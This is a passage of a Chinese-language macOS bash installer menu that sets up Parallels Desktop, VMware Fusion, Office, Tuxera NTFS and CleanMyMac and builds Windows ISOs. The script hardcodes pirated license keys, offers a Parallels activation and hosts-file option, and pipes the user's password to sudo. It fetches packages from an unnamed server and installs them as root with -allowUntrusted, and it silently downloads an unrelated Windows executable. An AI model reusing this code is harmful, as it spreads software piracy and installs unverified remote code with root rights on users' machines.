	if [ "$SourceMD5" ]; then	
if [ ! -f ~/Downloads/JG_Download/"$SourceMD5" ]; then
	echo
	echo "正在校验文件中..."
	TargetMD5=$(md5 ~/Downloads/JG_Download/"$name")
	TargetMD5=${TargetMD5##* }
	if [ "$TargetMD5" = "$SourceMD5" ]
	then
		clear && printf "\e[3J"
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：正确"
		echo "$TargetMD5" > ~/Downloads/JG_Download/"$TargetMD5"
	else
		clear && printf "\e[3J"
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：错误"
		echo
		rm -rf ~/Downloads/JG_Download/"$name"
		read -t 2 -p "MD5验证错误，已删除损坏的文件，将自动重新下载...如果一直重复，请通知技术员"
		Download
	fi
	fi	
	fi

	if [ "$SourceMD52" ]; then	
if [ ! -f ~/Downloads/JG_Download/"$SourceMD52" ]; then
	echo
	echo "正在校验文件中..."
	TargetMD52=$(md5 ~/Downloads/JG_Download/"$name2")
	TargetMD52=${TargetMD52##* }
	if [ "$TargetMD52" = "$SourceMD52" ]
	then
		clear && printf "\e[3J"
		echo
		echo "源文件MD52 = $SourceMD52"
		echo
		echo "目标文件MD52 = $TargetMD52"
		echo
		echo "MD5校验结果：正确"
		echo "$TargetMD52" > ~/Downloads/JG_Download/"$TargetMD52"
	else
		clear && printf "\e[3J"
		echo
		echo "源文件MD5 = $SourceMD52"
		echo
		echo "目标文件MD5 = $TargetMD52"
		echo
		echo "MD5校验结果：错误"
		echo
		rm -rf ~/Downloads/JG_Download/"$name2"
		read -t 2 -p "MD5验证错误，已删除损坏的文件，将自动重新下载...如果一直重复，请通知技术员"
		Download
	fi
	fi	
	fi



if [ "$azof" ]; then


if [ -f ~/Downloads/JG_Download/NTFS.dmg ]; then
hdiutil attach ~/Downloads/JG_Download/NTFS.dmg >/dev/null 2>&1	
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/Microsoft\ NTFS\ by\ Tuxera\ 2021/Install\ Tuxera\ NTFS.app/Contents/Resources/Packages/Flat/Install\ Tuxera\ NTFS.mpkg -target /
echo "3VV2VF-HQZ01U-MZ5ZU9-ZVEH45-H6CFE4" | tr -d '\n' | pbcopy
open /Library/PreferencePanes/Tuxera\ NTFS.prefPane
clear && printf "\e[3J"
exit
fi

if [ -f ~/Downloads/JG_Download/2021.pkg ]; then
curl -# -C - --connect-timeout 10 -o /tmp/qlvl.zip "$ip5/qlvl.zip"
unzip -o "/tmp/qlvl.zip" -d "/tmp">/dev/null 2>&1
curl -# -C - --connect-timeout 10 -o /tmp/2021.zip "$ip5/2021.zip"
unzip -o "/tmp/2021.zip" -d "/tmp">/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /tmp/qlvl.pkg -target /
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/2021.pkg -target /
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /tmp/2021.pkg -target /
clear && printf "\e[3J"
exit
fi

if [ -f ~/Downloads/JG_Download/2016.pkg ]; then
curl -# -C - --connect-timeout 10 -o /tmp/qlvl.zip "$ip5/qlvl.zip"
unzip -o "/tmp/qlvl.zip" -d "/tmp">/dev/null 2>&1
curl -# -C - --connect-timeout 10 -o /tmp/2016.zip "$ip5/2016.zip"
unzip -o "/tmp/2016.zip" -d "/tmp">/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /tmp/qlvl.pkg -target /
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/2016.pkg -target /
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /tmp/2016.pkg -target /
clear && printf "\e[3J"
exit
fi

clear && printf "\e[3J"
echo
echo
echo
echo "\033[36m不存在office安装文件！！！\033[0m"	
echo
exit

fi



if [ "$xgiso" ]; then
clear && printf "\e[3J"
rm -rf ~/Downloads/JG_Download/"$isoName".iso >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Downloads/JG_Download/ISO >/dev/null 2>&1
echo
echo "\033[36m正在下载必要工具，请等待...\033[0m"	
echo	
curl -# -C - --connect-timeout 10 -o /tmp/wim.zip --retry 8888 "$ip5/wim.zip"
curl -# -C - --connect-timeout 10 -o /tmp/autobc.cmd --retry 8888 "$ip5/autobc.cmd"
unzip -o "/tmp/wim.zip" -d "/tmp" >/dev/null 2>&1
clear && printf "\e[3J"
echo
echo "\033[36m正在拷贝系统，请等待...\033[0m"	
echo
mkdir -p $HOME/Downloads/JG_Download/ISO >/dev/null 2>&1
hdiutil attach $HOME/Downloads/JG_Download/"$name" >/dev/null 2>&1
cp -R /Volumes/Windows10-22H2-19045-CH-AUTO/* $HOME/Downloads/JG_Download/ISO
echo "$pass" | sudo -S sudo mv $HOME/Downloads/JG_Download/ISO/sources/install.esd $HOME/Downloads/JG_Download/ISO/sources/install.wim
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update $HOME/Downloads/JG_Download/ISO/sources/install.wim 1 --command "add /tmp/autobc.cmd /Windows/Setup/Scripts/SetupComplete.cmd"
echo "$pass" | sudo -S sudo /tmp/tools/bin/mkisofs -b "boot/etfsboot.com" --no-emul-boot --eltorito-alt-boot -b "efi/microsoft/boot/efisys.bin" --no-emul-boot --udf -iso-level 3 --hide "*" -V "$isoName" -o $HOME/Downloads/JG_Download/"$isoName".iso $HOME/Downloads/JG_Download/ISO
echo "$pass" | sudo -S sudo rm -rf $HOME/Downloads/JG_Download/ISO
open /System/Applications/Utilities/Boot\ Camp\ Assistant.app
open /Applications/Utilities/Boot\ Camp\ Assistant.app
clear && printf "\e[3J"
echo
echo
exit
fi

if [ "$qs15" ]; then
clear && printf "\e[3J"
echo
echo "\033[36m正在拷贝系统，请等待...\033[0m"	
echo
hdiutil attach ~/Downloads/JG_Download/"$name" >/dev/null 2>&1
hdiutil attach ~/Downloads/JG_Download/"$name2" >/dev/null 2>&1
cp -R /Volumes/Install\ macOS\ Catalina/Install\ macOS\ Catalina.app /Applications
open /Volumes/macOS\ Catalina\ Patcher/macOS\ Catalina\ Patcher.app
exit
fi


if [ "$sjefi" ]; then
clear && printf "\e[3J"
echo
echo "\033[36m正在写入EFI固件，请等待...\033[0m"	
echo
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/FirmwareUpdate.pkg -target /" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/FirmwareUpdate.pkg -target /
fi
if [ $? -ne 0 ] ; then
rm -rf ~/Downloads/JG_Download/"$xtname"
echo
read -s -n1 -p "写入失败，请重试！！！"
ZLDQ
fi
rm -rf ~/Downloads/JG_Download/"$xtname"
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"	
echo
echo "\033[36mEFI固件写入完成，选苹果系统重新启动\033[0m"
killall "System Preferences"
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi
open /System/Library/PreferencePanes/StartupDisk.prefPane
exit 0
fi	


if [ "$aztool" ]; then
clear && printf "\e[3J"
echo
echo "\033[36m正在安装Command_Line_Tools，请等待...\033[0m"	
echo
hdiutil attach ~/Downloads/JG_Download/$name >/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/FirmwareUpdate.pkg -target /" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/Command\ Line\ Developer\ Tools/Command\ Line\ Tools.pkg -target /
fi
diskutil eject /Volumes/Command\ Line\ Developer\ Tools
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "安装完成！！！"
Virtual
fi


if [ ! -f ~/Downloads/JG_Download/$isoName.ISO ];then

if [ "$uups" ];then
export all_proxy=""
destDir=""$HOME"/Downloads/JG_Download/UUPs"$isoName""
tempScript="UUPs.$isoName.txt"


/tmp/aria2c --no-conf --log-level=info --log="aria2_download.log" -o"$tempScript" --allow-overwrite=true --auto-file-renaming=false "$url3"

/tmp/aria2c --no-conf --log-level=info --log="aria2_download.log" -x16 -s16 -j5 -c -R -d"$destDir" -i"$tempScript"

	if [ ! -f $destDir/*.esd ]; then
	read -t 2 -p "未检测到下载文件，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Download
	fi
	
	if [ -f $destDir/*.aria2 ];then
	read -t 10 -p "下载不完整，10秒后将自动重试下载..."
	Download
	fi	
	
	if [ ! -f $destDir/*.aria2 ];then
	ISO
	else
	Download
	fi

fi
else
clear && printf "\e[3J"
echo
echo
read -t 10 -p "10秒后跳转安装虚拟机软件！"
M1Arm
fi


	
	
	echo
	echo "\033[32m\"${name##*/}\"下载完成！\033[0m"
	echo
	
	if [ ! -f ~/Downloads/JG_Download/"$isoName".iso ]; then
	if [ "$isoesd" ] ; then
	ISO
	fi
	fi
	
	if [ "$oldsj" ]; then
	AZPKG
	fi

	if [ "$azof" ]; then
	AZPKG
	fi
	
    if [ ! -f ~/Downloads/JG_Download/"$name".aria2 ]; then
    if [ "$xnjaz" ];then
	if [ -f ~/Downloads/JG_Download/M1Arm028.dmg ]; then
/tmp/aria2c -c -s25 -x16 -m0 -o soft.exe --check-certificate=false --console-log-level=warn --summary-interval=888888888 "https://webcdn.m.qq.com/spcmgr/download/QQSoftMgrInst_patch_20220621.exe" -d ~/Downloads/JG_Download	
	M1Arm
	fi
		
	if [ -f ~/Downloads/JG_Download/M1Arm11.dmg ]; then
	M1Arm
	fi	
			
	if [ -f ~/Downloads/JG_Download/M1VM_323.dmg ]; then
	M1Arm
	fi	
	
	if [ -f ~/Downloads/JG_Download/Vm10_914.dmg ]; then
	M1Arm
	fi
		
	if [ -f ~/Downloads/JG_Download/Vm7_914.dmg ]; then
	M1Arm
	fi
		
	if [ -f ~/Downloads/JG_Download/v7.dmg ]; then
	M1Arm
	fi		
					
	if [ -f ~/Downloads/JG_Download/v10_0131.dmg ]; then
	M1Arm
	fi	
			
	if [ -f ~/Downloads/JG_Download/Win10_0131.dmg ]; then
	M1Arm			
	fi
			
	if [ -f ~/Downloads/JG_Download/Win7_92.dmg ]; then
	M1Arm			
	fi

	if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.2-50703.dmg ]; then
    if [ "$azw11" ]; then
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.1-50696.dmg ]; then
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-16.5.1-50696.dmg
    fi
    fi
    if [ "$azw1125" ]; then
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-17.1.2-51548.dmg ]; then
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-17.1.2-51548.dmg
    fi
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-18.0.1-53056.dmg ]; then
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-18.0.1-53056.dmg 
    fi
    fi
    fi
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.1-50696.dmg ]; then
    if [ "$azw10" ]; then
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.2-50703.dmg ]; then
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-16.5.2-50703.dmg
    fi
    fi
    fi
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-17.0.1-51482.dmg ]; then
    if [ "$xnnew10" ]; then
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-17.1.2-51548.dmg ]; then
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-17.1.2-51548.dmg
    fi
    fi
    fi
    
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-18.0.0-53049.dmg >/dev/null 2>&1
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-17.1.1-51537.dmg >/dev/null 2>&1
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-17.1.0-51516.dmg >/dev/null 2>&1
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop-17.0.0-51461.dmg >/dev/null 2>&1
    
    
	if [ -f ~/Downloads/JG_Download/ParallelsDesktop-"$pdbb"*.dmg ]; then
	M1Arm			
	fi
	
	if [ -f ~/Downloads/JG_Download/VMware-Fusion*.dmg ]; then
	M1Arm			
	fi
	
	if [ -f ~/Downloads/JG_Download/PD17.dmg ]; then
	M1Arm			
	fi
	
	if [ -f ~/Downloads/JG_Download/PD16.dmg ]; then
	M1Arm			
	fi
		
	if [ -f ~/Downloads/JG_Download/PD14.dmg ]; then
	M1Arm			
	fi	
	
	if [ -f ~/Downloads/JG_Download/PD13.dmg ]; then
	M1Arm			
	fi		
	
	if [ -f ~/Downloads/JG_Download/PD10.dmg ]; then
	M1Arm			
	fi	
	
	if [ "$pd18sq" ]; then
	M1Arm			
	fi	

	if [ "$pd17sq" ]; then
	M1Arm			
	fi	
	
	if [ "$pd16sq" ]; then
	M1Arm			
	fi	
		
	fi
	fi	
					
	if [ "$pd107z" ] ; then
	M1Arm
	fi
	
	if [ "$appsj" ] ; then
	if [ -f ~/Downloads/JG_Download/app*.zip ];then
	echo
	echo
	unzip -o ~/Downloads/JG_Download/$name -d "/Applications">/dev/null 2>&1
	rm -rf ~/Downloads/JG_Download/$name
	open /Applications
	if [ "${CustomizeURL}" = "sj10.13" ];then
	open /Applications/Install\ macOS\ High\ Sierra.app
	fi
	if [ "${CustomizeURL}" = "sj10.14" ];then
	open /Applications//Install\ macOS\ Mojave.app
	fi
	if [ "${CustomizeURL}" = "sj10.15" ];then
	open /Applications/Install\ macOS\ Catalina.app
	fi
	if [ "${CustomizeURL}" = "sj11.0" ];then
	open /Applications/Install\ macOS\ Big\ Sur.app
	fi
	if [ "${CustomizeURL}" = "sj12.0" ];then
	open /Applications/Install\ macOS\ Monterey.app
	fi
	if [ "${CustomizeURL}" = "sj13.0" ];then
	open /Applications/Install\ macOS\ Ventura.app
	fi
	clear && printf "\e[3J"
    exit 0
	fi	
	fi
	
	if [ "$azmac" ] ; then
	BDMAC
	fi	
				
	if [ "$upazmac" ] ; then
	UPMAC
	fi
	
	if [ "$azuppe" ] ; then
	UPPE
	fi	
		
	if [ "$azbdpe" ] ; then
	BDPE
	fi	
	
	if [ "$wzbsjmac" ] ; then
	SjMacDos
	fi	
		
	if [ -f ~/Downloads/JG_Download/cmm.dmg ] ; then	
	hdiutil attach ~/Downloads/JG_Download/cmm.dmg >/dev/null 2>&1
	open /Volumes/CleanMyMac\ X\ 4.10.1/CleanMyMac\ X.app
	fi	
	
	echo
	read -s -n1 -p "按任意键返回 ... "
	open ~/Downloads/JG_Download
	
	Start_menu
	
}


Virtual(){

if [ ! "$isoyh" ]; then
isoyh="关"
fi
clear && printf "\e[3J"


yhid="$(id -un)" 

if groups $yhid | grep -q -w admin; then 
echo 
else 
echo
echo
echo
echo "  ""\033[42;30m 当前用户不是管理员, 无法安装！！！\033[0m"
echo
echo
echo
read -s -n1 -p " "
fi


if [ "$dkzdqx" ]; then
if [ "$zxos" ]; then
if ! plutil -lint /Library/Preferences/com.apple.TimeMachine.plist >/dev/null ; then
open "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles"
echo
echo
echo
read -s -n1 -p "注意：请先打开【终端】完全磁盘访问权限！！!" zdnum
if [ "$zdnum" = "0" ]; then
echo
ls ~/Downloads
dkzdqx=""
zdnum=""
Virtual
else
Virtual
fi
Virtual
fi
fi
fi

kykj="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/[^0-9]//g')"
if [ "$kykj" -lt "20" ]; then
echo
read -s -n1 -p "注意：剩余空间小于20G..."
fi
memtotal="$(($(sysctl -n hw.memsize) / 1024 / 1024/ 1024))"
modelbb="$(system_profiler SPHardwareDataType 2>/dev/null|awk '/Model Identifier:/ {print $NF}')"
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
pdbb="17"
if [ "$zxos" ]; then
vmbb="13.0.1"
vmkey="13.0"
licenseKey="4C21U-2KK9Q-M8130-4V2QH-CF810"
vvm20="1"
xxpd="1"
bigsur="1"
fi
if [[ $modelxh = "12."* ]]; then
vmbb="13.0.1"
vmkey="13.0"
licenseKey="4C21U-2KK9Q-M8130-4V2QH-CF810"
vvm20="1"
xxpd="1"
bigsur="1"
fi
if [[ $modelxh = "11."* ]]; then
#vmbb="12.2.4"
#vmkey="12.0"
#licenseKey="ZF3R0-FHED2-M80TY-8QYGC-NPKYF"
vmbb="13.0.1"
vmkey="13.0"
licenseKey="4C21U-2KK9Q-M8130-4V2QH-CF810"
#vvm19="1"
vvm20="1"
xxpd="1"
bigsur="1"
fi
if [[ $modelxh = "10.15"* ]]; then
vmbb="12.1.2"
vmkey="12.0"
licenseKey="ZF3R0-FHED2-M80TY-8QYGC-NPKYF"
vvm19="1"
pd16="1"
fi
if [[ $modelxh = "10.14"* ]]; then
vmbb="11.5.7"
vmkey="11.0"
licenseKey="TX1NF-PPVRW-A1XAX-X5PVZ-Q7ZTT"
pd1701="1"
vvm16="1"
pd16="1"
fi
if [[ $modelxh = "10.13"* ]]; then
pdbb="17"
vmbb="11.5.3"
vmkey="11.0"
licenseKey="TX1NF-PPVRW-A1XAX-X5PVZ-Q7ZTT"
pd1701="1"
vvm16="1"
pd16="1"
fi
if [[ $modelxh = "10.12"* ]]; then
pdbb="15"
vmkey="11.0"
licenseKey="TX1NF-PPVRW-A1XAX-X5PVZ-Q7ZTT"
vmbb="11.1.1"
vvm16="1"
fi
if [[ $modelxh = "10.11"* ]]; then
pdbb="14"
vmkey="10.0"
licenseKey="FG3TU-DDX1M-084CY-MFYQX-QC0RD"
vmbb="10.1.6"
vvm14="1"
fi
if [[ $modelxh = "10.10"* ]]; then
pddbb="1"
pdbb="13"
vmkey="8.0"
licenseKey="ZY7TK-A3D4N-08EUZ-TQN5E-XG2TF"
vmbb="8.5.10"
vvm12="1"
fi
if [[ $modelxh = "10.9"* ]]; then
pddbb="1"
pdbb="10"
vmkey="8.0"
licenseKey="ZY7TK-A3D4N-08EUZ-TQN5E-XG2TF"
vmbb="8.5.10"
vvm12="1"
nopd10="1"
fi
if [[ $modelxh = "10.8"* ]]; then
pddbb="1"
pdbb="10"
vmkey="7.0"
licenseKey="3ZPJT-H7ANX-M4RRC-NXGZE-0L5V1"
vmbb="7.1.2 "
nopd10="1"
fi
if [[ $modelxh = "10.7"* ]]; then
pddbb="1"
pdbb="10"
vmkey="6.0"
licenseKey="VZ15K-DKD85-M85EP-W4P79-XAAU4"
vmbb="6.0.4 "
nopd10="1"
fi
if [[ $modelxh = "10.6"* ]]; then
pddbb="1"
pdbb="10"
nopd10="1"
fi
if [[ $lang = "" ]]; then
lang2="简体"
lang3="zh-cn"
fi
if [[ $lang = "tw" ]]; then
lang2="繁体"
lang3="zh-tw"
fi
if [[ $lang = "en" ]]; then
lang2="英语"
lang3="en-us"
fi
if [[ $lang = "jp" ]]; then
lang2="日语"
lang3="ja-jp"
fi
if [[ $lang = "ko" ]]; then
lang2="韩语"
lang3="ko-kr"
fi
if [[ $modelbb = *"MacBookAir10,1"* ]]; then
M1Yes="1"
echo
dnjx="M1-20Air"
fi
if [[ $modelbb = *"iMac21,1"* ]]; then
M1Yes="1"
echo
dnjx="M1-20iMac"
fi
if [[ $modelbb = *"iMac21,2"* ]]; then
M1Yes="1"
echo
dnjx="M1-20iMac"
fi		
if [[ $modelbb = *"MacBookPro17,1"* ]]; then
M1Yes="1"
echo
dnjx="M1-20Pro"
fi	
if [[ $modelbb = *"MacBookPro18,1"* ]]; then
M1Yes="1"
echo
dnjx="M1-16寸-21Pro"
fi
if [[ $modelbb = *"MacBookPro18,2"* ]]; then
M1Yes="1"
echo
dnjx="M1-16寸-21Pro"
fi
if [[ $modelbb = *"MacBookPro18,3"* ]]; then
M1Yes="1"
echo
dnjx="M1-14寸-21Pro"
fi
if [[ $modelbb = *"MacBookPro18,4"* ]]; then
M1Yes="1"
echo
dnjx="M1-14寸-21Pro"
fi
if [[ $modelbb = *"Macmini9,1"* ]]; then
M1Yes="1"
echo
dnjx="M1-Mini-2020"
fi	
if [[ $modelbb = "Mac14,3" ]]; then
M1Yes="1"
echo
dnjx="M2-Mini-2023"
fi	
if [[ $modelbb = "Mac14,12" ]]; then
M1Yes="1"
echo
dnjx="M2-Mini-2023"
fi	
if [[ $modelbb = "Mac13,1" ]]; then
M1Yes="1"
echo
dnjx="Mac-Studio-2022"	
fi
if [[ $modelbb = "Mac13,2" ]]; then
M1Yes="1"
echo
dnjx="Mac-Studio-2022"	
fi
if [[ $modelbb = "Mac14,7" ]]; then
M1Yes="1"
echo
dnjx="M2-13寸-22Pro"
fi
if [[ $modelbb = "Mac14,2" ]]; then
M1Yes="1"
echo
dnjx="M2-13寸-22Air"
fi
if [[ $modelbb = "Mac14,4" ]]; then
M1Yes="1"
echo
dnjx="M2-14寸-23Pro"
fi
if [[ $modelbb = "Mac14,5" ]]; then
M1Yes="1"
echo
dnjx="M2-14寸-23Pro"
fi
if [[ $modelbb = "Mac14,9" ]]; then
M1Yes="1"
echo
dnjx="M2-14寸-23Pro"
fi
if [[ $modelbb = "Mac14,6" ]]; then
M1Yes="1"
echo
dnjx="M2-16寸-23Pro"
fi
if [[ $modelbb = "Mac14,10" ]]; then
M1Yes="1"
echo
dnjx="M2-16寸-23Pro"
fi
echo
echo "识别本机机型："$dnjx""
if [ "$M1Yes" ]; then
azpd7="......."
azvm7="......."
#vmbb="M1    "
vmbb="13.0.1"
else
azpd7="PD-Win7"
azvm7="VM-Win7"
fi
EFIS=""
HBFQS=""
PEDrv=""
repe=""
name=""
url=""
name2=""
url2=""
mjh7=""
soft=""
re700=""
re800=""
index=""
OsWin764=""
SourceSHA1=""
SourceMD5=""
SourceMD52=""
pnputil=""
Win11=""
drvname=""
xtname=""
xtname2=""
xnjaz=""
pd107z=""
azw11=""
azw10=""
azw7=""
isoesd=""
isoName=""
uups=""
iso7=""
hfhost=""
azqdq=""
cqpdfw=""
if [ ! "$zdpdbb" ]; then
zdpdbb="18"
fi
if [ ! "$scpdxx" ]; then
scpdxx="开"
scpdk="1"
fi
if [ ! "$zazxt" ]; then
zazxt="关"
zazxtt=""
fi
echo
echo "    ______________________       Virtual      ______________________"
echo "   |                      --------------------                      |"
echo "   |   \033[35m[Z]\033[0m $lang2                                                     |"
echo "   |                                                                |"
echo "   |   \033[35m[1]\033[0m Parallels Desktop $pdbb              \033[35m[J]\033[0m JHPD15-18          |"
echo "   |                                                                |"
echo  "   |   \033[35m[2]\033[0m PD-Win10        \033[35m[3]\033[0m $azpd7                              |"
echo "   |                                                                |"
echo  "   |   \033[35m[4]\033[0m VM-Win10        \033[35m[5]\033[0m $azvm7                              |"
echo "   |                                                                |"
echo  "   |   \033[35m[6]\033[0m VMware Fusion $vmbb                                     |"
echo "   |                                                                |"
echo "   |   \033[35m[8]\033[0m PD-Win11        \033[35m[M]\033[0m MSDN                                 |"
echo "   |                                                                |"
echo "   |   \033[35m[24]\033[0m New-Win10      \033[35m[28]\033[0m New-Win11                           |"
echo "   |                                                                |"
echo "   |   \033[35m[H]\033[0m 恢复Hosts       \033[35m[Q]\033[0m 启动器壹      \033[35m[W]\033[0m 启动器贰           |"
echo "   |                                                                |"
echo "   |   \033[35m[S]\033[0m 安装时删除旧虚拟机系统 [$scpdxx]       \033[35m[T]\033[0m 启动器叁           |"
echo "   |                                                                |"
echo "   |   \033[35m[D]\033[0m 切换安装Parallels Desktop [$zdpdbb]    \033[35m[L]\033[0m 签名启动器         |"
echo "   |                                                                |"
echo "   |   \033[35m[C]\033[0m 重启PD服务     \033[35m[PD18]\033[0m PD18     \033[35m[B]\033[0m 仅安装虚拟机系统 [$zazxt] |"
echo "   |                                                                |"
echo  "   |   \033[35m[x]\033[0m 返回           \033[35m[Y]\033[0m WinYH"$isoyh"       \033[35m[29]\033[0m 最新M-Win11        |"
echo "   |                                                                |"
echo "   |________________________________________________________________|"
echo
echo
echo
if [ ! "$drvn11" ]; then
read -p "_______请输入:" num
fi
echo
case "$num" in
    l)
    if [ ! -e /Library/Developer/CommandLineTools ]; then
    clear && printf "\e[3J"
    read -s -n1 -p "未安装签名工具！！！请先安装！！！"
    ZLDQ
    fi
    if [ ! -e /Applications/启动Win系统.app ]; then
    clear && printf "\e[3J"
    read -s -n1 -p "未安装启动器！！！请先安装！！！"
    Virtual
    fi
    qmqdq="1"
    AZPKG
    ;;
    j)
    if [ ! -e /Applications/Parallels\ Desktop.app ]; then
    clear && printf "\e[3J"
    echo
	echo	
	echo
	read -s -n1 -p "当前未安装虚拟机软件！！！"
	Virtual
    fi
PD_LOC="/Library/Preferences/Parallels/parallels-desktop.loc"
PD_DIR="/Applications/Parallels Desktop.app"; [ -f "${PD_LOC}" ] && PD_DIR=$(cat "${PD_LOC}")
MY_VST=$(defaults read "${PD_DIR}/Contents/Info.plist" CFBundleShortVersionString)
MY_VID=$(defaults read "${PD_DIR}/Contents/Info.plist" CFBundleVersion)
MY_VER="${MY_VST}-${MY_VID}"
if [ ! "$MY_VER" ]; then 
    clear && printf "\e[3J"
    echo
	echo	
	echo
	read -s -n1 -p "无法识别当前版本，请重新安装PD虚拟机！"
	Virtual
fi
if [[ $MY_VER = "10."* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
if [[ $MY_VER = "11."* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
if [[ $MY_VER = "12."* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
if [[ $MY_VER = "13."* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
if [[ $MY_VER = "14."* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
if [[ $MY_VER = "18.2"* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
if [[ $MY_VER = "18.3"* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
if [[ $MY_VER = "18.4"* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
if [[ $MY_VER = "18.5"* ]]; then    
clear && printf "\e[3J"
echo
echo	
echo
read -s -n1 -p "目前只支持PD15-PD18.1.1"
Virtual  
fi
    jhpd="1"
    AZPKG
    ;;
    x32)
    xcs="32"
    Virtual
    ;;
    x128)
    xcs="128"
    Virtual
    ;;
    pd18)
    xnjaz="1"
    pd18sq="1"
    name="ParallelsDesktop-18.0.1-53056.dmg"
    url="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop*.dmg >/dev/null 2>&1   
    AZPKG
    ;;
    pd17)
    xnjaz="1"
    pd17sq="1"
    name="ParallelsDesktop-17.1.2-51548.dmg"
    url="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop*.dmg >/dev/null 2>&1  
    AZPKG
    ;;
    pd16)
    if [ "$M1Yes" ]; then
    xnjaz="1"
    pd16sq="1"
    name="ParallelsDesktop-16.5.1-50696.dmg"
    url="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop*.dmg >/dev/null 2>&1
    AZPKG
    else
    xnjaz="1"
    pd16sq="1"
    name="ParallelsDesktop-16.5.0-49183.dmg"
    url="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
    rm -rf ~/Downloads/JG_Download/ParallelsDesktop*.dmg >/dev/null 2>&1
    AZPKG
    fi
    ;;
    z)
	if [ "$lang" = "" ]; then
	lang="tw"
	Virtual
	fi
	if [ "$lang" = "tw" ]; then
	lang="en"
	Virtual
	fi
	if [ "$lang" = "en" ]; then
	lang="jp"
	Virtual
	fi
	if [ "$lang" = "jp" ]; then
	lang="ko"
	Virtual
	fi
	if [ "$lang" = "ko" ]; then
	lang=""
	Virtual
	fi	
	;;
	y)
	if [[ "$isoyh" = "关" ]]; then
	isoyh="开"
	xtyh="1"
	Virtual
	fi
	if [[ "$isoyh" = "开" ]]; then
	isoyh="关"
	xtyh=""	
	Virtual
	fi
	;;
	d)
	if [ "$zdpdbb" = "18" ]; then
	zdpdbb="17"
	Virtual	
	fi
	if [ "$zdpdbb" = "17" ]; then
	zdpdbb="16"
	Virtual	
	fi
	if [ "$zdpdbb" = "16" ]; then
	zdpdbb="18"
	Virtual
	fi
	;;
	s)
	if [ "$scpdxx" = "开" ]; then
	scpdxx="关"
	scpdk=""
	Virtual
	fi	
    if [ "$scpdxx" = "关" ]; then
	scpdxx="开"
	scpdk="1"
	Virtual
	fi	
	;;
	b)
	if [ "$zazxt" = "开" ]; then
	zazxt="关"
	zazxtt=""
	Virtual
	fi	
    if [ "$zazxt" = "关" ]; then
